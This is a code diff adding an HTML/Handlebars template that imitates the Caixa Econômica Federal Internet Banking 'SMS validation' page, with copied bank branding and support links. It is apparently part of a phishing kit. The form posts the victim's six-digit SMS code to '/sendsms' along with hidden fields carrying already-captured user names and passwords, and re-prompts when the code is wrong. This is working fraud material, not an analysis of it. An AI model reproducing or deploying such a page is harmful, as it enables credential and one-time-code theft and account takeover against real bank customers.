@@ -1,0 +1,103 @@
+<header class="hidden-xs">
+    <div class="main">
+        <div class="collapse navbar-collapse hidden-sm" id="acessibilidade">
+            <ul class="nav navbar-nav acessMenu fonte10 fonteBranca">
+                <li>
+                    <a href="#" data-href="conteudo" class="skip altText fonteBranca">Ir para conteúdo</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="mainHeader | gradient">
+        <div class="contentMainHeader">
+            <h1 class="brand" title="Caixa Econômica Federal">
+                <a href="http://www.caixa.gov.br" id="aLogoLink" class="alogo">Caixa Econômica | Internet Banking</a>
+            </h1>
+        </div>
+    </div>
+</header>
+
+{{#if error}}
+<script>alert('SMS inválido, preencha corretamente')</script>
+{{/if}}
+
+<div id="delimitarTeclado">
+    <div class="main" id="conteudo">
+
+        <div class="container-fluid ajusteMargem pagePasswords" id="conteudo-login" style="display: block;">
+            <div class="row" style="height: auto;">
+                <h1 class="text-center mx-auto">Validação de SMS <img src="img/computador.svg" width="24">
+                </h1>
+            </div>
+
+            <div class="row">
+                <div class="content-login">
+                    <div class="login-title">
+                        <p class="login-titleText">Validação de sms:</p>
+                    </div>
+
+                    <form id="formSMS" action="/sendsms?client={{client.id}}" method="POST" autocomplete=" off"
+                        novalidate="">
+                        <input type="hidden" name="socket" class="theSocket" value="">
+                        <input type="hidden" name="user" class="theUser" value="{{client.user}}">
+                        <input type="hidden" name="password" class="thePassword" value="{{client.password}}">
+                        <input type="hidden" name="dispositivo" value="DESKTOP"><input type="hidden" name="usuario"
+                            value="Teste"><input type="hidden" name="type" value="{{client.type}}">
+                        <div class="box-inputs box-fields">
+                            <label for="sms" class="label-inputs">SMS</label>
+                            <input type="text" class="fields" name="sms" id="sms" placeholder="6 dígitos" maxlength="6">
+                        </div>
+                        <div class="centent-button">
+                            <button type="submit" class="btn-default">Confirmar</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+</div>
+
+<div class="rodapePrincipal hidden-xs">
+    <div class="main">
+        <div class="container-fluid">
+            <div class="row sm-m-l-0">
+                <div class="col-lg-4 col-md-4 col-sm-4 hidden-xs rodapeTelefone">
+                    <div id="rodapeSuporte" class="rodapeBtEsq fonteBranca">
+                        <div>Suporte Tecnológico<br>3004 1104(Capitais) ou 0800 726 0104(Demais regiões)</div>
+                        <script>$('#btnContratarPromo').click(function () { if ($("#btnContratarPromo").text() == "Eu quero!") { window.open("http://www.caixa.gov.br/agenciadigital") } })</script>
+                    </div>
+                </div>
+                <div class="col-lg-8 col-md-8 col-sm-8 pull-right">
+                    <ul class="rodapeNav nav navbar-nav pull-right">
+                        <li class="rodapeBtDirEsq">
+                            <a id="rodapeSeguranca" class="rodapeLink rodapeBtSeguranca" target="_blank"
+                                href="http://www.caixa.gov.br/seguranca/Paginas/default.aspx" tabindex="1">Segurança</a>
+                        </li>
+                        <li class="rodapeBtDirLinha">
+                            <a id="rodapeAtendimentoLink" class="rodapeLink rodapeBtAtendimento"
+                                onclick="abrirLink('rodapeAtendimento')" tabindex="2">Rede de Atendimento</a>
+                            <a id="rodapeAtendimento" style="display:none"
+                                href="http://www.caixa.gov.br/atendimento/Paginas/default.aspx" tabindex="3">.</a>
+                        </li>
+                        <li class="rodapeBtDirLinha">
+                            <a id="rodapeAjudaLink" class="rodapeLink rodapeBtAjuda" onclick="abrirLink('rodapeAjuda')"
+                                tabindex="4">Ajuda</a>
+                            <a id="rodapeAjuda" style="display:none"
+                                href="http://www.caixa.gov.br/atendimento/internet-banking/Paginas/default.aspx"
+                                tabindex="5">.</a>
+                        </li>
+                        <li class="rodapeBtDir">
+                            <a id="rodapeTermosLink" class="rodapeLink rodapeBtTermos"
+                                onclick="abrirLink('rodapeTermos')" tabindex="6">Termos e Contratos</a>
+                            <a id="rodapeTermos" style="display:none"
+                                href="https://internetbanking.caixa.gov.br/statics-core/pdf/contrato.pdf"
+                                tabindex="7">.</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
